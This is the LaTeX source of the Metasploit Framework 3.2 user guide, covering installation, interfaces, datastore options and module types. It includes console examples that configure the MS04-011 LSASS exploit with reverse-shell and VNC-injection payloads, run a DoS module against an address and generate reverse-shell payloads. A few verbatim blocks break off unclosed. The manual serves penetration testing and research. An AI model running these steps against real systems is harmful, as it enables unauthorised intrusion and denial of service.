\chapter{Introduction}

\par
This is the official user guide for version 3.2 of the Metasploit Framework. This 
guide is designed to provide an overview of what the framework is, how it works,
and what you can do with it. The latest version of this document can be found
on the Metasploit Framework web site. 

\par
The Metasploit Framework is a platform for writing, testing, and using exploit code.
The primary users of the Framework are professionals performing penetration testing,
shellcode development, and vulnerability research.

\chapter{Installation}

    \section{Installation on Unix}
    \label{INSTALL-UNIX}
\par
Installing the Framework is as easy as extracting the tarball, changing into the
created directory, and executing your preferred user interface. We strongly
recommend that you use a version of the Ruby interpreter that was built with
support for the GNU Readline library. If you are using the Framework on Mac OS
X prior to 10.5.1, you will need to install GNU Readline and then recompile the Ruby
interpreter.  Using a version of Ruby with Readline support enables tab completion
of the console interface.  The \texttt{msfconsole} user interface is preferred for everyday
use, but the \texttt{msfweb} interface can be useful for live demonstrations.

\par
To perform a system-wide installation, we recommend that you copy the entire
Framework directory into a globally accessible location (/usr/local/msf) and
then create symbolic links from the msf* applications to a directory in the
system path (/usr/local/bin). User-specific modules can be placed into
\texttt{HOME/.msf3/modules} directory.  The structure of this directory should
mirror that of the global modules directory found in the framework
distribution.

\par
The latest stable release of the Ruby interpreter (1.8.7-p72) contains a bug which
breaks many of the Metasploit Framework modules. The only way to work around this 
bug is by downgrading to an older version of 1.8.6 or by upgrading to the latest
stable snapshot of 1.8.7. The latest stable snapshot can be downloaded from 
\url{ftp://ftp.ruby-lang.org/pub/ruby/stable-snapshot.tar.gz}. For more information
about this issue, please see the Ubuntu ticket: \url{https://bugs.launchpad.net/bugs/282302}.



    \section{Installation on Windows}
    \label{INSTALL-WIN32}

\par
The Metasploit Framework is fully supported on the Windows platform. To install the Framework on Windows, 
download the latest version of the Windows installer from \url{http://metasploit.com/framework/download/}, perform 
an online update, and launch the \texttt{msfgui} interface from the Start Menu. To access a standard
\texttt{msfconsole} interface, select the Console option from the Window menu. As an alternative, you can
use the \texttt{msfweb} interface, which supports Mozilla Firefox and Internet Explorer.


    \section{Platform Caveats}
    \label{INSTALL-CAVEAT}

\par
When using the Framework on the Windows platform, keep in mind that \texttt{msfgui} and \texttt{msfweb} are the only
supported user interfaces. While \texttt{msfcli} may appear to work on the command line, it will will run into
trouble as soon as more than one active thread is present. This can prevent most exploits, auxiliary modules,
and plugins from functioning. This problem does not occur within Cygwin environment. The Windows platform does
not support raw IP packet injection, packet injection, wireless driver exploitation, or SMB relaying attacks
without specific configuration. In most cases, those features can be accessed by running Metasploit inside of a 
Linux-based virtual machine (such as BackTrack 3 in VMWare).

    \section{Supported Operating Systems}
    \label{INSTALL-SUPPORT}

\par
The Framework should run on almost any Unix-based operating system that includes a complete and modern version 
of the Ruby interpreter (1.8.4+). Every stable version of the Framework is tested with three primary platforms: 

\begin{itemize}
\item Linux 2.6 (x86, ppc)
\item Windows NT (2000, XP, 2003, Vista)
\item MacOS X 10.5 (x86, ppc)
\end{itemize}

\par
For information about manually installing the framework, including all of the required dependencies needed
to use the new \texttt{msfgui} interface, please see the framework web site: \url{http://metasploit.com/framework/support}

    \section{Updating the Framework}
    \label{INSTALL-UPDATE}

\par
The Framework can be updated using a standard \texttt{Subversion} client. The
old \texttt{msfupdate} tool is no longer supported. Windows users can click on
the Online Update link within the Metasploit 3 program folder on the Start Menu.
To obtain the latest updates on a Unix-like platform, change into the Framework 
installation directory and execute \texttt{svn update}. If you are accessing the
internet through a HTTP proxy server, please see the Subversion FAQ on proxy 
access: \url{http://subversion.tigris.org/faq.html#proxy}

\pagebreak

\chapter{Getting Started}

    \section{The Console Interface}
    \label{STARTED-CONSOLE}

\par
After you have installed the Framework, you should verify that everything is
working properly  The easiest way to do this is to execute the
\texttt{msfconsole} user interface. If you are using Windows, start the \texttt{msfgui}
interface and access the \texttt{Console} link from the Window menu.
The console should display an ASCII art logo, print the current version, some module
counts, and drop to a "msf> " prompt. From this prompt, type \texttt{help} to get a list of
valid commands. You are currently in the "main" mode; this allows you to list
exploits, list payloads, and configure global options.  To list all available
exploits, type \texttt{show exploits}. To obtain more information about a given
exploit, type \texttt{info module\_name}. 

\par
The console interface was designed to be flexible and fast. If you
enter a command that is not recognized by the console, it will scan the system
path to determine if it is a system command. \footnote{If you are accessing the console
through \texttt{msfweb}, this feature has been disabled for security reasons.}
If it finds a match, that command will be executed with the supplied arguments. This allows you to use
your standard set of tools without having to leave the console. The console interface
supports tab completion of known commands. The \texttt{msfweb} interface
includes tab completion by default, but the \texttt{msfconsole} interface requires that 
Ruby was built with the Readline library. For more information on tab completion, please
refer to appendix \ref{REF-TAB}.

\par
The console startup will similar to the text below.

\begin{verbatim}



                 o                       8         o   o

       =[ 45 aux

msf >            
\end{verbatim}

    \section{The GUI Interface}
    \label{STARTED-GUI}

\par
The \texttt{msfgui} interface was introduced in version 3.1 and provides the functionality
of \texttt{msfconsole} in addition to many new features. To access a \texttt{msfconsole}
shell, select the Console option from the Window menu. To search for a module within the
module tree, enter a string or regular expression into the search box and click the button
labeled Find. All matching modules will appear the tree below. To execute a module, 
double-click its name in the tree, or right-click its name and select the Execute option.
To view the source code of any module, right-click its name and select the View Code option.

\par
Once a module is selected, a wizard-based interface will walk you through the process of
configuring and launching the module. In the case of exploit modules, the output from
the module will appear in the main window under the Module Output tab. Any sessions created
by the module will appear in the Sessions view in the main window. To access a session,
double-click the session name in the view, or open a Console and use the \texttt{sessions}
command to interact with the shell. Metepreter sessions will spawn a shell when double-clicked,
but also offer a process and file browser via the right-click context menu. 


    \section{The Command Line Interface}
    \label{STARTED-CLI}

\par
If you are looking for a way to automate exploit testing, or simply do not want
to use an interactive interface, then \texttt{msfcli} may be the solution.
\footnote{The msfcli interface will not work properly with the native Windows version of Ruby}
This interface takes a module name as the first parameter, followed by the options
in a VAR=VAL format, and finally an action code to specify what should be done.
The module name is used to determine which exploit or auxiliary module you
want to launch.

\par
The action code is a single letter; S for summary, O for options, A for advanced
options, I for IDS evasions, P for payloads, T for targets, AC for auxiliary
actions, C to try a vulnerability check, and E to exploit. The saved
datastore will be loaded and used at startup, allowing you to configure
convenient default options in the Global or module-specific datastore of
\texttt{msfconsole}, save them, and take advantage of them in the
\texttt{msfcli} interface. As of version 3.1, the \texttt{msfcli} interface
will also work with auxiliary modules.

    \section{The Web Interface}
    \label{STARTED-WEB}

\par
The \texttt{msfweb} interface is based on Ruby on Rails. To access this interface,
execute \texttt{msfweb} to start up the server. The \texttt{msfweb}
interface uses the WEBrick web server to handle requests. By default, \texttt{msfweb} will listen
on the loopback address (127.0.0.1) on port 55555. A log message should be displayed indicating that
the service has started. To access the interface, open your browser to the appropriate URL 
(\url{http://127.0.0.1:55555/} by default). The main \texttt{msfweb} interface consists of a toolbar
containing various icons and a background with the metasploit logo. If you want access to a console, 
click the Console link. This console interface is nearly identical to the standard 
\texttt{msfconsole} interface. The Exploits, Auxiliary, and Payloads links will walk you through 
the process of selecting a module, configuring it, and running it. Once an exploit is run and
a session is created, you can access these sessions from the Sessions link. These icons will open up
a sub-window within the page. These windows can be moved, minimized, maximized, and closed.

\pagebreak
\chapter{The DataStore}

\par
The datastore system is a core component of the Framework.  The interfaces use
it to configure settings, the payloads use it patch opcodes, the exploits
use it to define parameters, and it is used internally to pass options between
modules.  There are two types of datastores.  First, there is a single global
datastore that can be accessed using the \texttt{setg} and \texttt{unsetg}
commands from \texttt{msfconsole}.  Second, each module instance has its own
datastore in which arbitrary options or parameters can be stored.  For
example, when the \texttt{RHOST} option is set, its value is stored in the
datastore of the module instance that it was set relative to.  In the event
that an option was not set in a module instance's datastore, the framework
will consult the global datastore to see if it was set there.

    \section{Global DataStore}
    \label{ENV-GLOBAL}
\par
The Global datastore is accessed through the console via the \texttt{setg} and
\texttt{unsetg} commands. The following example shows the Global datastore
state after a fresh installation. Calling \texttt{setg} with no arguments
displays the current global datastore. Default settings are automatically
loaded when the interface starts.

\begin{verbatim}
msf > setg

Global
======

No entries in data store.

\end{verbatim}

    \section{Module DataStore}
    \label{ENV-TEMP}
\par

The module datastore is accessed through the \texttt{set} and \texttt{unset}
commands. This datastore only applies to the currently loaded module;
switching to another module via the \texttt{use} command will result in the
module datastore for the current module being swapped out with the datastore
of the new module. If no module is currently active, the \texttt{set} and
\texttt{unset} commands will operate on the global datastore. Switching back
to the original module will initialize a new datastore for the module.  To
persist the contents of either the global or module-specific datastores, the
\texttt{save} command should be used.

    \section{Saved DataStore}
    \label{ENV-SAVE}

\par
The \texttt{save} command can be used to synchronize the Global and all module
datastores to disk. The saved environment is written to
\texttt{HOME/.msf3/config} and will be loaded when any of the user interfaces
are executed.  

    \section{DataStore Efficiency}
    \label{ENV-EFF}

\par
This split datastore system allows you save time during exploit development
and penetration testing. Common options between exploits can be defined in the
Global datastore once and automatically used in any exploit you load thereafter.  

\par
The example below shows how the \texttt{LPORT}, \texttt{LHOST}, and
\texttt{PAYLOAD} global datastore can be used to save time when exploiting a
set of Windows-based targets. If this datastore was set and a Linux exploit
was being used, the module datastore (via \texttt{set} and \texttt{unset})
could be used to override these defaults.  

{\footnotesize
\begin{verbatim}
f > setg LHOST 192.168.0.10
LHOST => 192.168.0.10
msf > setg LPORT 4445
LPORT => 4445
msf > setg PAYLOAD windows/shell/reverse_tcp
PAYLOAD => windows/shell/reverse_tcp
msf > use windows/smb/ms04_011_lsass
msf exploit(ms04_011_lsass) > show options

Module options:

...

Payload options:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process
   LHOST     192.168.0.10     yes       The local address
   LPORT     4445             yes       The local port

...

\end{verbatim}}

    \section{DataStore Variables}
    \label{ENV-VAR}
\par
The datastore can be used to configure many aspects of the Framework, ranging
from user interface settings to specific timeout options in the network socket
API. This section describes the most commonly used environment variables.  

\par
For a complete listing of all environment variables, please see the file
Environment.txt in the ``documentation'' subdirectory of the Framework. 

	\subsection{LogLevel}
\par
This variable is used to control the verbosity of log messages provided
by the components of the Framework.  If this variable is not set, framework
logging is disabled.  Setting this variable to 0 will turn on default log
messages.  A value of 1 will enable additional, non-verbose log messages that
may be helpful in troubleshooting.  A value of 2 will enable verbose debug
logging.  A value of 3 will enable all logging and may generate a large amount
of log messages.  Only use this when much additional information is required.
Log files are stored in the logs subdirectory of the user's configuration
directory (~/.msf3/logs). Unlike version 2 of the framework, debugging
messages are never written directly to the console.

	\subsection{MsfModulePaths}
\par
This variable can be used to add additional paths from which to load modules.
By default, the framework will load modules from the modules directory found
within the framework install.  It will also load modules from ~/.msf3/modules
if such a path exists.  This variable makes it possible to statically define
additional paths from which to load modules.

\pagebreak

\chapter{Using the Framework}

	\section{Choosing a Module}
\par
From the \texttt{msfconsole} interface, you can view the list of modules that
are available for you to interact with.  You can see all available modules
through the \texttt{show all} command.  To see the list of modules of a
particular type you can use the \texttt{show moduletype} command, where
\textit{moduletype} is any one of exploits, encoders, payloads, and so on.  
You can select a module with the \texttt{use} command by specifying the
module's name as the argument.  The \texttt{info} command can be used to view
information about a module without using it.  Unlike Metasploit 2.x, the new
version of Metasploit supports interacting with each different module types
through the \texttt{use} command.  In Metasploit 2.x, only exploit modules
could be interacted with.

	\section{Exploit Modules}

\par
Exploit modules are the defacto module in Metasploit which are used to
encapsulate an exploit.

		\subsection{Configuring the Active Exploit}

\par 
Once you have selected an exploit with the \texttt{use} command, the next step
is to determine what options it requires. This can be accomplished with the
\texttt{show options} command. Most exploits use \texttt{RHOST} to specify the
target address and \texttt{RPORT} to set the target port. Use the \texttt{set}
command to configure the appropriate values for all required options. If you
have any questions about what a given option does, refer to the module source
code.  Advanced options are available with some exploit modules, these can be
viewed with the \texttt{show advanced} command. Options useful for IDS and IPS
evasion can be viewed with the \texttt{show evasion} command.

		\subsection{Verifying the Exploit Options}

\par	
The \texttt{check} command can be used to determine whether the target
system is vulnerable to the active exploit module. This is a quick way to
verify that all options have been correctly set and that the target is
actually vulnerable to exploitation. Not all exploit modules have implemented
the check functionality.  In many cases it is nearly impossible to determine
whether a service is vulnerable without actually exploiting it. A
\texttt{check} command should never result in the target system crashing or
becoming unavailable. Many modules display version information and
expect you to analyze it before proceeding.  

		\subsection{Selecting a Target}

\par Many exploits will require the \texttt{TARGET} environment variable to be
set to the index number of the desired target. The \texttt{show targets}
command will list all targets provided by the exploit module. Many exploits
will default to a brute-force target type; this may not be desirable in all
situations. 

		\subsection{Selecting the Payload}

\par	The payload is the actual code that will run on the target system after
a successful exploit attempt. Use the \texttt{show payloads} command to list
all payloads compatible with the current exploit. If you are behind a
firewall, you may want to use a bind shell payload, if your target is behind
one and you are not, you would use a reverse connect payload. You can use the
\texttt{info payload\_name} command to view detailed information about a given
payload.  

\par
Once you have decided on a payload, use the \texttt{set} command to specify
the payload module name as the value for the \texttt{PAYLOAD} environment
variable. Once the payload has been set, use the \texttt{show options} command
to display all available payload options. Most payloads have at least one
required option. Advanced options are provided by a handful of payload
options; use the \texttt{show advanced} command to view these. Please keep in
mind that you will be allowed to select any payload compatible with that
exploit, even if it not compatible with your currently selected
\texttt{TARGET}. For example, if you select a Linux target, yet choose a BSD
payload, you should not expect the exploit to work.

		\subsection{Launching the Exploit}

\par The \texttt{exploit} command will launch the attack. If everything went
well, your payload will execute and potentially provide you with an
interactive command shell on the exploited system. 

	\section{Auxiliary Modules}

\par
Metasploit 3.0 supports the concept of auxiliary modules which can be used to
perform arbitrary, one-off actions such as port scanning, denial of service,
and even fuzzing.
	
		\subsection{Running an Auxiliary Task}

\par
Auxiliary modules are quite a bit similar to exploit modules.  Instead of
having targets, they have actions, which are specified through the
\texttt{ACTION} option.  To run an auxiliary module, you can either use the
\texttt{run} command, or you can use the \texttt{exploit} command -- they're
both the same thing.

\begin{verbatim}
msf > use dos/windows/smb/ms06_035_mailslot
msf auxiliary(ms06_035_mailslot) > set RHOST 1.2.3.4
RHOST => 1.2.3.4
msf auxiliary(ms06_035_mailslot) > run
[*] Mangling the kernel, two bytes at a time...
\end{verbatim} 

	\section{Payload Modules}

\par
Payload modules encapsulate the arbitrary code (shellcode) that is executed as
the result of an exploit succeeding.  Payloads typically build a communication
channel between Metasploit and the victim host.

		\subsection{Generating a Payload}

\par
The console interface supports generating different forms of a payload.  This
is a new feature in Metasploit 3.0.  To generate payloads, first select a
payload through the \texttt{use} command.

\begin{verbatim}
msf > use windows/shell_reverse_tcp
msf payload(shell_reverse_tcp) > generate -h
Usage: generate [options]

Generates a payload.

OPTIONS:

    -b <opt>  The list of characters to avoid: '\x00\xff'
    -e <opt>  The name of the encoder module to use.
    -h        Help banner.
    -o <opt>  A comma separated list of options in VAR=VAL format.
    -s <opt>  NOP sled length.
    -t <opt>  The output type: ruby, perl, c, or raw.

msf payload(shell_reverse_tcp) >  
\end{verbatim}

\par
Using the options supported by the \texttt{generate} command, different
formats of a payload can be generated.  Some payloads will require options
which can be specified through the \texttt{-o} parameter.  Additionally, a
format to convey the generated payload can be specified through the
\texttt{-t} parameter. To save the resulting data to a local file, pass the
\texttt{-f} parameter followed by the output file name.

\begin{verbatim}
msf payload(shell_reverse_tcp) > set LHOST 1.2.3.4
LHOST => 1.2.3.4
msf payload(shell_reverse_tcp) > generate -t ruby

	\section{Nop Modules}

\par
NOP modules are used to generate no-operation instructions that can be used
for padding out buffers.

		\subsection{Generating a NOP Sled}

\par
The NOP module console interface supports generating a NOP sled of an
arbitrary size and displaying it in a given format through the
\texttt{generate} command.

\begin{verbatim}
msf > use x86/opty2
msf nop(opty2) > generate -h
Usage: generate [options] length

Generates a NOP sled of a given length.

OPTIONS:

    -b <opt>  The list of characters to avoid: '\x00\xff'

\chapter{Advanced Features}

\par
This section covers some of the advanced features that can be found in this
release. These features can be used in any compatible exploit and highlight
the strength of developing attack code using an exploit framework. 

\section{The Meterpreter}
\par
The Meterpreter is an advanced multi-function payload that can be dynamically
extended at run-time. In normal terms, this means that it provides you with a
basic shell and allows you to add new features to it as needed. Please refer
to the Meterpreter documentation for an in-depth description of how it works
and what you can do with it. The Meterpreter manual can be found in the
``documentation'' subdirectory of the Framework as well as online at:

\url{http://www.metasploit.com/documents/meterpreter.pdf}

\section{PassiveX Payloads}

\par The Metasploit Framework can be used to
load arbitrary ActiveX controls into a target process. This feature works by
patching the registry of the target system and causing the exploited process
to launch internet explorer with a URL pointing back to the Framework. The
Framework starts up a simple web server that accepts the request and sends
back a web page instructing it to load an ActiveX component. The exploited
system then downloads, registers, and executes the ActiveX. 

\par
The basic PassiveX payload, \texttt{windows/xxx/reverse\_http}, supports any
custom ActiveX that you develop. In addition to the base payload, three other
PassiveX modules are included in the Framework. These can be used to execute a
command shell, load the Meterpreter, or inject a VNC service. When any of
these three payloads are used, the PassiveX object will emulate a TCP
connection through HTTP GET and POST requests. This allows you to interact
with a command shell, VNC, or the Meterpreter using nothing but standard HTTP
traffic.

\par
Since PassiveX uses the Internet Explorer browser to load the ActiveX
component, it will pass right through an outbound web proxy, using whatever
system and authentication settings that have already been configured. The
PassiveX payloads will only work when the target system has Internet Explorer
6.0 installed (not 5.5 or 7.0). For more information about PassiveX,
please see the Uninformed Journal article titled "Post-Exploitation on Windows
using ActiveX Controls", located online at:

\url{http://www.uninformed.org/?v=1&a=3&t=pdf}

\section{Chainable Proxies}
\par
The Framework includes transparent support for TCP proxies, this release has
handler routines for HTTP CONNECT and SOCKSv4 servers. To use a proxy with a
given exploit, the \texttt{Proxies} environment variable needs to be set. The value of
this variable is a comma-separated list of proxy servers, where each server is
in the format type:host:port. The type values are 'http' for HTTP CONNECT and
'socks4' for SOCKS v4. The proxy chain can be of any length; testing shows that
the system was stable with over five hundred SOCKS and HTTP proxies configured
randomly in a chain. The proxy chain only masks the exploit request, the
automatic connection to the payload is not relayed through the proxy chain at
this time. 

\section{Win32 UploadExec Payloads}
\par
Although Unix systems normally include all of the tools you need for
post-exploitation, Windows systems are notoriously lacking in a decent command
line toolkit. The windows/upexec/* payloads included in this release allow you to
simultaneously exploit a Windows system, upload your favorite tool, and execute
it, all across the payload socket connection. When combined with a
self-extracting rootkit or scripting language interpreter (perl.exe!), this can
be a very powerful feature. The Meterpreter payloads are usually much better
suited for penetration testing tasks.  

\section{Win32 DLL Injection Payloads}
\par
The Framework includes a staged payload that is
capable of injecting a custom DLL into memory in combination with any Win32
exploit. This payload will not result in any files being written to disk; the
DLL is loaded directly into memory and is started as a new thread in the
exploited process. This payload was developed by Jarkko Turkulainen and Matt
Miller and is one of the most powerful post-exploitation techniques developed
to date. To create a DLL which can be used with this payload, use the
development environment of choice and build a standard Win32 DLL. This DLL
should export an function called Init which takes a single argument, an
integer value which contains the socket descriptor of the payload connection.
The Init function becomes the entry point for the new thread in the exploited
process. When processing is complete, it should return and allow the loader
stub to exit the process according to the \texttt{EXITFUNC} environment
variable. If you would like to write your own DLL payloads, refer to the
external/source/dllinject directory in the Framework. In additional to normal
DLL Injection, version 3.2 and newer include support for Reflective DLL Injection
payloads as well. For more information about Reflective DLL Injection, please see
the Harmony Security paper, located at 
\url{http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf}

\section{VNC Server DLL Injection}
\par
One of the first DLL injection payloads developed was a customized VNC server.
This server was written by Matt Miller and based on the RealVNC source code.
Additional modifications were made to allow the server to work with exploited,
non-interactive network services. This payload allows you to immediately access
the desktop of an exploited system using almost any Win32 exploit. The DLL is
loaded into the remote process using any of the staged loader systems, started
up as a new thread in the exploited process, and the listens for VNC client
requests on the same socket used to load the DLL. The Framework listens
on a local socket for a VNC client and proxies data across the payload
connection to the server.  

\par
The VNC server will attempt to obtain full access to the current interactive
desktop. If the first attempt fails, it will call RevertToSelf() and then try
the attempt again. If it still fails to obtain full access to this desktop, it
will fall back to a read-only mode. In read-only mode, the Framework user can
view the contents of the desktop, but not interact with it. If full access was
obtained, the VNC server will spawn a command shell on the desktop with the
privileges of the exploited service. This is useful in situations where an
unprivileged user is on the interactive desktop, but the exploited service is
running with System privileges.  

\par
If there is no interactive user logged into the system or the screen has been
locked, the command shell can be used to launch explorer.exe anyways. This can
result in some very confused users when the logon screen also has a Start Menu.
If the interactive desktop is changed, either through someone logging into the
system or locking the screen, the VNC server will disconnect the client. Future
versions may attempt to follow a desktop switch. 

\par
To use the VNC injection payloads, specify the full path to the VNC server as
the value of the \texttt{DLL} option. The VNC server can be found in the data
subdirectory of the Framework installation and is named 'vncdll.dll'. The source
code of the DLL can be found in the external/source/vncdll
subdirectory of the Framework installation. 

\par
There are a few situations where the VNC inject payload
will simply not work. These problems are often cause by strange execution
environments or other issues related to a specific exploit or injection method.
These issues will be addressed as time permits:
\begin{itemize}
	\item The windows/brightstor/universal\_agent exploit will cause the VNC payload to
	crash, possibly due to a strange heap state.
\end{itemize}

\begin{verbatim}
msf > use windows/smb/ms04_011_lsass
msf exploit(ms04_011_lsass) > set RHOST some.vuln.host
RHOST => some.vuln.host
msf exploit(ms04_011_lsass) > set PAYLOAD windows/vncinject/reverse_tcp
PAYLOAD => windows/vncinject/reverse_tcp
msf exploit(ms04_011_lsass) > set LHOST your.own.ip
LHOST => your.own.ip
msf exploit(ms04_011_lsass) > set LPORT 4321
LPORT => 4321
msf exploit(ms04_011_lsass) > exploit
\end{verbatim}

If the "vncviewer" application is in your path and the AUTOVNC option has been
set (it is by default), the Framework will automatically open the VNC desktop.
If you would like to connect to the desktop manually, \texttt{set AUTOVNC 0}, then use
vncviewer to connect to 127.0.0.1 on port 5900.

\chapter{Security}

\par
We recommend that you use a robust, secure terminal emulator when
utilizing the command-line interfaces. Examples include \texttt{konsole},
\texttt{gnome-terminal}, and recent versions of \texttt{PuTTY}.

\par
We do not recommend that the \texttt{msfweb} interface be used on untrusted
networks. 

	\section{Console Interfaces}
\par
The console does not perform terminal escape sequence filtering, this
could allow a hostile network service to do Bad Things (TM) to your terminal
emulator when the exploit or check commands are used. We suggest that you
use a terminal emulator which limits the functionality available through
hostile escape sequences. Please see the Terminal Emulator Security Issues paper
below for more information on this topic:

\url{http://marc.info/?l=bugtraq&m=104612710031920&q=p3}


	\section{Web Interface}
\par
The \texttt{msfweb} interface does not adequately filter certain arguments,
allowing a hostile web site operator to perform a cross-site scripting
attack on the \texttt{msfweb} user.

\par
The \texttt{msfweb} interface does not provide any access control functionality. If
the service is configured to listen on a different interface (default is
loopback), a malicious attacker could abuse this to exploit remote systems
and potentially access local files. The local file access attack can be
accomplished by malicious arguments to the payloads which use a local file
as input and then exploiting a (fake) service to obtain the file contents.

\chapter{General Tips}

	\section{Tab Completion}
	\label{REF-TAB}
\par
On the Unix and Cygwin platforms, tab completion depends on the existence of the Readline 
library when Ruby was compiled. Some operating systems, such as Mac OS X, have included
a version of Ruby without this support. To solve this problem, grab the latest version
of the Readline library, configure, build, and install it. Then grab the latest version
of the Ruby interpreter and do the same. The resulting Ruby binary can be used to start the
\texttt{msfconsole} interface with full tab completion support.


	\section{Secure Socket Layer}
	\label{REF-SSL}
\par
Nearly all TCP-based exploit and auxiliary modules have builtin support for the Secure Socket Layer.
This is a feature of the Socket class included with the Rex library. To indicate that all connections
should use SSL, set the \texttt{SSL} environment variable to \texttt{true} from within the Framework
interface. Keep in mind, that in most cases the default \texttt{RPORT} variable will need to be 
changed as well. For example, when exploiting a web application vulnerability through SSL, the
\texttt{RPORT} value should be set to \texttt{443}.
